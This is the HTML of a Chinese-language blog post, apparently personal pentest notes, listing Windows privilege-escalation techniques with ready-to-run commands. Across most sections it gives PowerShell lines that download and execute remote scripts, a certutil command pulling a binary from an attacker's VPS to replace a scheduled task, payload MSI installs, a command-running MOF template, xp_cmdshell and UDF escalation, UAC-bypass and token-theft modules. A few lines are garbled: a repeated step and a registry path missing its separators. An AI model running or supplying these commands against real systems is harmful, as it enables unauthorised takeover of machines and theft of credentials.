@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            windows提权
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">windows提权</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2023-03-16
+                        </span>
+                        
+                            <span id="/2023/03/16/windows提权/" class="leancloud_visitors" data-flag-title="windows提权">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/03/16/windows提权/"></span>
+                        </span>  
+                    </p>
+                    
+                        
+                            <span class="category-color">杂记</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">杂记</span>
+                        
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h2 id="系统内核溢出漏洞提权"><a href="#系统内核溢出漏洞提权" class="headerlink" title="系统内核溢出漏洞提权"></a><a herf="系统内核溢出漏洞提权">系统内核溢出漏洞提权</a></h2><p>1.系统内核溢出漏洞提权<br>简介：此提权方法是利用系统本身存在的一些系统内核溢出漏洞，但未曾打相应的补丁，攻击者通过对比systeminfo信息中的补丁信息来查找缺失的补丁号，通过缺失补丁号对照相应的系统版本查找对应可以提权提升的exp</p>
+<p>注意，只要对应的补丁号加上对应的系统的版本的提权exp才可以成功，有时候如果查找到提权exp提权不成功，那么就可以查看是不是系统版本没对应上，且不排除一些提权漏洞利用需要相应的环境。</p>
+<p>查找补丁的手法：</p>
+<ol>
+<li>#手工查找补丁情况</li>
+</ol>
+<p>systeminfo<br>Wmic qfe get Caption,Description,HotFixID,InstalledOn</p>
+<ol start="2">
+<li>#MSF后渗透扫描</li>
+</ol>
+<p>post&#x2F;windows&#x2F;gather&#x2F;enum_patches<br>post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</p>
+<p>#windows exploit suggester<br><a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p>
+<p>工具使用需要python2 环境</p>
+<ol>
+<li>安装xlrd包（注意python2、3版本的pip问题）<br>使用python2 的pip来安装xlrd包<br>命令：python2 -m pip install xlrd&#x3D;&#x3D;1.2.</li>
+</ol>
+<p>注意：<br>安装的xlrd版本必须为1.2.0版本，否则使用时会报错，原因是：最近xlrd更新到了2.0.1版本，只支持.xls文件。所以pandas.read_excel(‘xxx.xlsx’)会报错。</p>
+<ol start="2">
+<li><p>获取对应的漏洞信息库(注意要使用python2来获取)<br>命令：python2 windows-exploit-suggester.py –update<br>成功后会生成一个xls表格文件</p>
+</li>
+<li><p>生成要进行对比的靶机的系统信息<br>命令：systeminfo &gt; systeminfo_win10.txt #在对应的靶机上运行该命令</p>
+</li>
+<li><p>生成要进行对比的靶机的系统信息<br>命令：systeminfo &gt; systeminfo_win10.txt #在对应的靶机上运行该命令</p>
+</li>
+</ol>
+<p>查找到缺失的补丁后，对照相应的系统版本，查找对应的exp<br><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br><a target="_blank" rel="noopener" href="https://bugs.hacking8.com/tiquan/">https://bugs.hacking8.com/tiquan/</a><br><a target="_blank" rel="noopener" href="https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation">https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation</a><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a><br><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p>
+<h2 id="系统配置错误提权"><a href="#系统配置错误提权" class="headerlink" title="系统配置错误提权"></a><b herf="系统配置错误提权">系统配置错误提权</b></h2><ol start="2">
+<li>系统配置错误提权<br>简介：windows系统服务文件在操作系统启动时加载和运行，并在后台调用可执行文件。理论上，低权限用户是没有对高权限服务调用的可执行文件写权限，但是，如果因管理员错误的配置，导致一个低权限的用户对此类系统服务调用的可执行文件拥有写权限，那么低权限用户就可以将该文件替换成任意可执行文件，这样就可以劫持系统服务，获得该系统服务的权限，而windows服务是以system权限运行的，所以低权限用户就能获得系统权限。（利用条件比较苛刻）</li>
+</ol>
+<p>系统服务权限配置错误利用有如下两种方式：服务未启动：攻击者可以使用任意服务替换原来的服务，然后重启服务 服务正在运行且无法被终止：这种情况符合绝大多数的漏洞利用场景，攻击者通常会利用dll劫持技术并尝试重启服务来提权(需要administrtor权限)</p>
+<p>查找错误配置的手法：</p>
+<ol>
+<li>#powerup提供了一些本地提权的方法，可以通过很多实用的脚本来寻找目标机器的windows服务漏洞</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp</a><br>可直接通过powershell远程加载<br>powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1">https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1</a>‘); Invoke-AllChecks”</p>
+<ol start="2">
+<li>#msf 对应的模块为exploit&#x2F;windows&#x2F;local&#x2F;service_permissions  但前提是获得一个会话</li>
+</ol>
+<p>run exploit&#x2F;windows&#x2F;local&#x2F;service_permissions #自动化提权，回来的的权限就是system</p>
+<ol start="3">
+<li>#查看指定目录的权限配置情况</li>
+</ol>
+<p>accesschk.exe -dqv “D:\test” -accepteula<br>参数说明：“M”表示修改，“F”代表完全控制，“CI”代表从属容器将继承访问控制项，“OI”代表从属文件将继承访问控制项。</p>
+<ol start="4">
+<li>#检查服务 如果是.SERVICE_ALL_ACCESS的意思是我们对“Vulnerable Service”的属性拥有完全控制权</li>
+</ol>
+<p>accesschk.exe -uwcqv “Authenticated Users” * &#x2F;accepteula<br>sc qc 服务名   #查看可以完全控制的服务的属性。</p>
+<p>#把服务启动的行为（exe或者脚本，com组件..）替换成我们的MSF反弹木马，当服务重启时，就会给我们返回一个system权限的meterpreter<br>set AutoRunScript migrate -f#正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程<br>为什么要自动迁移？<br>这是因为当一个服务在Windows系统中启动后，它必须和服务控制管理器通信，如果没有通信，服务控制管理器会认为出现了错误，并会终止这个进程，我们所有需要做的就是在终止载荷进程之前，将它迁移到其它进程。</p>
+<p>#run exploit&#x2F;windows&#x2F;local&#x2F;service_permissions<br>run exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</p>
+<p>#找到我们具有完全控制权限的服务，修改服务配置执行命令<br>sc config 服务名 binpath &#x3D; “木马程序.exe”   #INARY_PATH_NAME参数指向了该服务的可执行程序<br>sc stop 服务名<br>sc start 服务名</p>
+<p>这里可以用木马程序可以用exe，任意脚本，dll文件等等，具体情况具体分析</p>
+<h2 id="schtasks-exe"><a href="#schtasks-exe" class="headerlink" title="schtasks.exe"></a><c herf="schtasks.exe">schtasks.exe</c></h2><ol start="3">
+<li>schtasks.exe<br>简介：windows操作系统提供了一个实用程序（schtasks.exe）,使系统管理员能够在特定的时间执行程序或脚本（在大多数情况下，计划任务是以NT Authority\System高权限执行的），如果地权限用户对计划任务所在目录有读写权限，完全可以替换计划任务所执行的脚本或程序，获得高权限（但需要错误配置，让此目录下其他用户可写）。</li>
+</ol>
+<p>官方说明文档：</p>
+<p><a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa446802(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/aa446802(v=vs.85).aspx</a></p>
+<p>查找错误配置的手法：<br>#schtask 查询<br>schtasks &#x2F;query &#x2F;fo LIST 2&gt;nul</p>
+<p>#powershell<br>Get-ScheduledTask</p>
+<p>利用手法：#进行筛选 删除包含&#x2F;Microsoft&#x2F;Windows&#x2F;路径的所有任务<br>Get-ScheduledTask | Select * | ? {($<em>.TaskPath -notlike “\Microsoft\Windows*“) -And ($</em>.Principal.UserId -notlike “<em>$env:UserName</em>“)} | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @{Name&#x3D;”User”;Expression&#x3D;{$_.Principal.userID}}</p>
+<p>#分析计划任务  查找行为，比如exe，脚本什么的<br>$task&#x3D; Get-ScheduledTask -TaskName 计划任务名<br>ForEach ($triger in $task.Triggers) { echo $triger.Repetition.Interval}</p>
+<p>#查找计划任务行为所在目录，低权限用户是否具有可写权限  accesschk.exe  当然也可以用icacls命令<br><code>accesschk64.exe -accepteula -wv lowuser C:\ScheduledTasks\Task1\1111.exe</code></p>
+<p>#直接替换<br><code>certutil -urlcache -split -f &quot;http://你的vps/1111.exe&quot; C:\ScheduledTasks\Task1\1111.exe</code></p>
+<p>#等待计划任务执行</p>
+<h2 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a><d herf="可信任服务路径漏洞">可信任服务路径漏洞</d></h2><ol start="4">
+<li>可信任服务路径漏洞<br>简介：如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的。</li>
+</ol>
+<p>原理：对于C:\Program Files\Some Folder\Service.exe文件路径中的每一个空格，windows都会尝试寻找并执行名字与空格前的名字向匹配的程序。操作系统会对文件路径中空格的所有可能进行尝试，直到找到一个匹配的程序。以上面的例子为例，windows会依次尝试确定和执行下面的程序：</p>
+<p>C:\Program.exe</p>
+<p>C:\Program Files\Some.exe</p>
+<p>C:\Program Files\Some Folder\Service.exe</p>
+<p>所以如果我们能够上传一个适当命名的恶意可执行程序在受影响的目录，比如这里我把木马名字改了Program.exe，放在c盘小,一旦此服务重启，因为优先级的缘故，服务会优先选择我们木马Program.exe，而不是C:\Program Files\Some Folder\Service.exe，那么我们的恶意程序就会以system权限运行(大多数情况下)。</p>
+<p>查找错误配置的手法：</p>
+<p>#wmi查找含有漏洞的服务命令<br><code>wmic service get name,displayname,pathname,startmode|findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr/i /v &quot;&quot;&quot;</code></p>
+<p>#PowerUp脚本<br><a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp</a><br>powershell.exe -exec bypass -Command “&amp;{Import-Module .\PowerUp.ps1; Invoke-AllChecks}”</p>
+<p>##查看指定目录的权限配置情况<br>accesschk.exe -dqv “D:\test” -accepteula</p>
+<p>漏洞利用手法：</p>
+<p>#msf攻击模块<br>exploit&#x2F;windows&#x2F;local&#x2F;trusted_service_path<br>set AutoRunScript migrate -f</p>
+<p>#手动攻击<br>我们需要执行的exe根据需要重命名并放置在可写入的有漏洞目录下<br>然后重启服务<br>sc stop service_name<br>sc start service_name</p>
+<h2 id="不安全的注册表权限配置"><a href="#不安全的注册表权限配置" class="headerlink" title="不安全的注册表权限配置"></a><e herf="不安全的注册表权限配置">不安全的注册表权限配置</e></h2><ol start="4">
+<li>不安全的注册表权限配置<br>简介:在Windows中，和Windows服务有关的信息存储在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services注册表项中,服务对应的程序路径存储在HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service\服务名\ImagePath，如果低权限用户对这个键值有写权限，那么就可以控制这个服务，运行我们的程序，拿到高权限。</li>
+</ol>
+<p>检测服务的注册表路径是否有写权限</p>
+<p>#微软的工具<br><a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/search.aspx?q=subinacl">https://www.microsoft.com/en-us/download/search.aspx?q=subinacl</a><br>subinacl.exe &#x2F;key reg “HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service\服务名” &#x2F;display</p>
+<p>利用：</p>
+<p>#如果我们对注册表有写入权限，就可以修改注册表，使得服务启动时运行我们的恶意程序<br>reg add “HKEY_LOCAL_MACHINESYSTEMControlSet001ServicesVulnerable Service360rp” &#x2F;t REG_EXPAND_SZ &#x2F;v ImagePath &#x2F;d “C:programdataadduser.exe” &#x2F;f</p>
+<h2 id="启用注册表键AlwaysInstallElevated"><a href="#启用注册表键AlwaysInstallElevated" class="headerlink" title="启用注册表键AlwaysInstallElevated"></a><f herf="启用注册表键AlwaysInstallElevated">启用注册表键AlwaysInstallElevated</f></h2><ol start="5">
+<li>启用注册表键AlwaysInstallElevated<br>简介：注册表键AlwaysInstallElevated是一个策略设置项。windows允许低权限用户以System权限运行安装文件。如果启用此策略设置项，那么任何权限用户都能以NT AUTHORITY\SYSTEM权限来安装恶意的MSI(Microsoft Windows Installer)文件。</li>
+</ol>
+<p>查看是否启用：</p>
+<p>#PowerUp<br><code>powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module .\PowerUp.ps1;Get-RegistryAlwaysInstallElevated&#125;&quot;</code></p>
+<p>#当然也可以查看注册表键值是否被定义<br><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code><br><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></p>
+<p>利用方式：</p>
+<p>#利用方法,启用AlwaysInstallElevated后，可以通过命令行调用msiexec安装msi文件，msi文件内包含要执行的Payload，Payload将会以System权限执行<br>msiexec &#x2F;quiet &#x2F;qn &#x2F;i muma.msi</p>
+<p>#msf   需要一个会话<br>run exploit&#x2F;windows&#x2F;local&#x2F;always_install_elevated</p>
+<h2 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a><g herf="组策略首选项提权">组策略首选项提权</g></h2><ol start="6">
+<li>组策略首选项提权<br>简介：Windows 2008 Server引入了一项新功能：策略首选项，组策略首选项使管理员可以部署影响域中计算机&#x2F;用户的特定配置，通过在组策略管理控制台中配置的组策略首选项，管理员可以推出多种策略，例如，当用户登录其计算机时自动映射网络驱动器，更新内置管理员帐户的用户名或对注册表进行更改。</li>
+</ol>
+<p>SYSVOL：<br>SYSVOL是AD(活动目录)里面一个存储域公共文件服务器副本的共享文件夹，所有的认证用户都可以读取。SYSVOL包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为SYSVOL能在所有域控里进行自动同步和共享。</p>
+<p>所有的组策略均存储在如下位置：</p>
+<p>\<DOMAIN>\SYSVOL&lt;DOMAIN&gt;\Policies\</p>
+<p>组策略偏好GPP<br>win2008发布了GPP(Group Policy Preferences)，其中GPP最有用的特性，是在某些场景存储和使用凭据，其中包括：映射驱动（Drives.xml）创建本地用户数据源（DataSources.xml）打印机配置（Printers.xml）创建&#x2F;更新服务（Services.xml）计划任务（ScheduledTasks.xml）更改本地Administrator密码</p>
+<p>为方便对所有机器进行操作，网络管理员会使用域策略进行统一的配置和管理，那么所有机器的本地管理员密码就是一样的，造成了即使不知道密码的情况下也能修改组策略首选项的密码，也可以通过脚本破解组策略首选项文件中密码的漏洞。</p>
+<p>利用手法：</p>
+<p>#Powershell获取cpassword<br>Get-GPPPassword.ps1</p>
+<p>#PowerSploit 的 Get-GPPPassword模块 检索通过组策略首选项推送的帐户的明文密码和其他信息。<br>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1');Get-GPPPassword%22Import-Module">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;Import-Module</a> .\Get-GPPPassword.ps1;Get-GPPPassword<br>kali gpp-decrypt命令破解密码</p>
+<p>#Msf<br>run post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp</p>
+<p>#Empire<br>usemodule privesc&#x2F;gpp</p>
+<h2 id="bypassUAC提权"><a href="#bypassUAC提权" class="headerlink" title="bypassUAC提权"></a><h herf="bypassUAC提权">bypassUAC提权</h></h2><ol start="7">
+<li>bypassUAC提权<br>简介：bypassUAC已经是老生长谈的话题了，用户帐户控制(UAC)，它是Windows的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC确保仅在管理员授权的情况下进行某些更改。</li>
+</ol>
+<p>UAC如何运行？<br>UAC通过阻止程序执行任何涉及有关系统更改&#x2F;特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被“提升权限”，而不是以管理员身份运行的程序。</p>
+<p>一些没有管理员权限无法完成的操作：</p>
+<p>注册表修改（如果注册表项在HKEY_LOCAL_MACHINE下（因为它影响多个用户），它将是只读的）<br>加载设备驱动程序<br>DLL注入<br>修改系统时间（时钟）<br>修改用户帐户控制设置（通过注册表，可以启用&#x2F;禁用该设置，但您需要正确的权限才能执行此操作）<br>修改受保护的目录（例如Windows文件夹，Program Files）<br>计划任务（例如，以管理员权限自动启动）<br>UAC不会自动阻止恶意软件，其目的不是确定程序是否是恶意软件，而是在没有用户许可下对恶意软件的未授权行为进行掌控。</p>
+<p>利用手法：</p>
+<p>#Msf<br>exploit&#x2F;windows&#x2F;local&#x2F;ask       #弹出UAC确认窗口，点击后获得system权限</p>
+<p>exploit&#x2F;windows&#x2F;local&#x2F;bypassuac  #此模块将通过进程注入使用可信任发布者证书绕过Windows UAC，它将生成关闭UAC标志的第二个shell。</p>
+<p>exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection #此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload 二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。如果指定exe::custom，应在单独的进程中启动 payload 后调用ExitProcess（）</p>
+<p>exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_fodhelper#此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定exe:custom，则应在单独的进程中启动payload后调用ExitProcess（）。</p>
+<p>exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr#此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE ::Custom，则应在单独的进程中启动payload后调用ExitProcess（）</p>
+<p>exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_comhijack#此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些较高完整性级别进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL,这些DLL包含导致会话权限提升的payload。此模块修改注册表项，但在调用payload后将清除该项,这个模块需要payload的体系架构和操作系统匹配，但是当前的低权限meterpreter会话体系架构中可能不同。如果指定exe:：custom，则应在单独的进程中启动payloa后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件,因此，如果cmd.exe访问受到限制，此模块将无法正常运行。</p>
+<p><code>#Powershell</code><br><code>Invoke-PsUACme</code></p>
+<p><code>#Empire</code><br><code>usemodule privesc/bypassuac</code><br><code>usemodule privesc/bypassuac_wscript</code></p>
+<p>#cs<br>uac-dll<br>uac-token-duplication<br>….</p>
+<h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a><i herf="令牌窃取">令牌窃取</i></h2><ol start="8">
+<li>令牌窃取<br>简介：令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。</li>
+</ol>
+<p>令牌有很多种：</p>
+<p>访问令牌(Access Token)：表示访问控制操作主体的系统对象 。</p>
+<p>会话令牌(Session Token)：是交互会话中唯一的身份标识符。</p>
+<p>密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾。</p>
+<p>利用方式：</p>
+<p>#msf 拿到一个会话<br><code>use incognito  </code>         #进入incognito模块<br><code>list_tokens -u   </code>       #列出令牌<br><code>Delegation Token：</code>也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)<br><code>Impresonation Token：</code>模拟令牌，它是非交互的会话。</p>
+<p>这里窃取令牌，主要是窃取进程中的令牌<br>#使用令牌假冒用户<br>impresonate_Token “令牌名”<br>……<br>这里也可以用其他的cs，empire上面的令牌窃取功能模块</p>
+<p>说起令牌，让我想到了土豆（加模仿高权限令牌）！！！！这玩意真好用，真牛逼！</p>
+<p>项目地址：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/breenmachine/RottenPotatoNG/">https://github.com/breenmachine/RottenPotatoNG/</a></p>
+<p>RottenPotato(烂土豆）提权的原理可以简述如下：</p>
+<p>欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。<br>对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌（过程为通过一系列的Windows API调用）。<br>模仿这个令牌，只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌，一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。<br>当然土豆系列都牛逼class！附上甜土豆github地址</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a></p>
+<h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a><j herf="数据库提权">数据库提权</j></h2><ol start="6">
+<li>数据库提权：<br>在windows上经常会装这两个数据库</li>
+</ol>
+<p>sqlserver数据库提权<br>MySQL数据库提权<br>所以直接针对这两个数据库进行提权。</p>
+<p>MSSQL提权：<br>启用xp_cmdshell（高权限用户）</p>
+<p>#先获取高权限的数据库用户(sysadmin）<br>查找网站源码数据库链接文件（web.config &#x2F;conn.asp&#x2F;aspx config.asp &#x2F;aspx dbconfig.asp&#x2F;aspx)等文件，查找数据库链接信息，查找可进入数据库的用户名和密码</p>
+<p>理论上，什么用户启的数据库，xp_cmdshell就执行什么权限</p>
+<p>#爆破出用户名密码，或者收集到密码….等手段登入数据库，mssql可以外网登录<br>select IS_SRVROLEMEMBER(‘sysadmin’)#查询是否为sysadmin用户，sysadmin执行命令继承了数据库的权限，前提在windows下，数据库(旧版本，新版本默认降权)默认没有被降权,默认就是system权限<br>如果有注入的话，sqlmap –is-dba 也能判断</p>
+<p>#然后利用高权限用户执行反弹命令，脚本，木马什么的…<br>默认cmd的组件禁用，必须安装cmd_shell组件<br><code>EXEC sp_configure &#39;show advanced options&#39;, 1</code><br><code>GO</code><br><code>RECONFIGURE</code><br><code>GO </code><br><code>EXEC sp_configure &#39;xp_cmdshell&#39;, 1</code><br><code>GO</code><br><code>RECONFIGURE</code><br><code>GO</code></p>
+<p><code>exec master..xp_cmdshell &quot;whoami&quot; --</code></p>
+<p>MYSQL提权<br>MOF提权<br>简介：MOF文件是mysql数据库的扩展文件（在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡，因为MOF文件每五秒就会执行，且是系统权限，所以如果我们有权限替换原有的mof文件，就能获得system权限</p>
+<p>利用条件<br>Windows&lt;&#x3D;2003（虽然很久远了，还是温习一下）<br>mysql在c:windows&#x2F;system32&#x2F;mof目录有写权限<br>已知数据库账号密码<br>利用手法：</p>
+<p>#mysql语句将恶意mov文件替换nullevt.mof，需先上传<br><code>select load_file(&quot;hacker.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</code></p>
+<p>mof文件样本<br><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</code><br><code>instance of __EventFilter as $EventFilter</code><br><code>&#123;</code><br><code>EventNamespace = &quot;Root\\Cimv2&quot;;</code><br><code>Name = &quot;filtP2&quot;;</code><br><code>Query = &quot;Select * From __InstanceModificationEvent &quot;</code><br><code>&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</code><br><code>&quot;And TargetInstance.Second = 5&quot;;</code><br><code>QueryLanguage = &quot;WQL&quot;;</code><br><code>&#125;;</code><br><code>instance of ActiveScriptEventConsumer as $Consumer</code><br><code>&#123;</code><br><code>Name = &quot;consPCSV2&quot;;</code><br><code>ScriptingEngine = &quot;JScript&quot;;</code><br><code>ScriptText =</code><br><code>&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;命令\&quot;)&quot;;</code><br><code>&#125;;</code><br><code>instance of __FilterToConsumerBinding</code><br><code>&#123;</code><br><code>Consumer = $Consumer;</code><br><code>Filter = $EventFilter;</code><br><code>&#125;;</code></p>
+<p>UDF提权<br>简介：UDF,user defined funcion,即用户自定义函数，用户可以通过自己增加函数对mysql功能进行扩充，文件后缀为.dll。</p>
+<p>利用条件<br>windows2003、windowsXP、windows7<br>拥有mysql的insert和delete权限<br>漏洞利用：</p>
+<p>#首先我们要判断mysql版本，根据不同的版本：<br>mysql版本 &lt; 5.2 , UDF导出到系统目录c:&#x2F;windows&#x2F;system32&#x2F;<br>mysql版本 &gt; 5.2 ，UDF导出到安装路径MySQL\Lib\Plugin<br>直接查询插件安装目录show variables like %plugin%</p>
+<p>#上传udf.dll 将udf.dll导出到插件目录，然后执行sql语句创建用户自定义函数,并利用他执行命令提权<br>create function cmd_shell returns string soname ‘udf.dll’;#创建函数<br>select cmd_shell(‘命令’);#使用函数<br>drop function cmd_shell; #删除函数</p>
+<p>#也可以自动化过程，使用sqlmap自动化上传插件<br>python sqlmap.py -u ‘xxxx’ –file-write&#x3D;&#x2F;lib_mysqludf_sys.so  –file-dest&#x3D;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;<br>python sqlmap.py -u ‘xxxx’ –sql-shell</p>
+<p>各种CVE<br>CVE-2016-6663和CVE-2016-6664,CVE-2016-6663,CVE-2016-6664,CVE-2016-6663,CVE-2016-6664</p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/touxiang.jpg" alt="章鱼海绵">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>章鱼海绵
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2023/03/16/windows%E6%8F%90%E6%9D%83/" target="_blank">windows提权</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
+                        
+                            <a href="/categories/%E6%9D%82%E8%AE%B0/">杂记</a>
+                        
+                    </div>
+                
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="/tags/%E6%9D%82%E8%AE%B0/">杂记</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
+                    
+                    
+                        <a href="/2023/03/15/ciphey%E8%A7%A3%E7%A0%81/" class="next-prefix">» </a> 下一篇：    <a href="/2023/03/15/ciphey%E8%A7%A3%E7%A0%81/" title="发布于 2023-03-15 08:09">ciphey解码</a>
+                    
+                </div>
+            </div>
+            
+    <div class="article-comments">
+        
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+
+        </div>
+    
+</div>
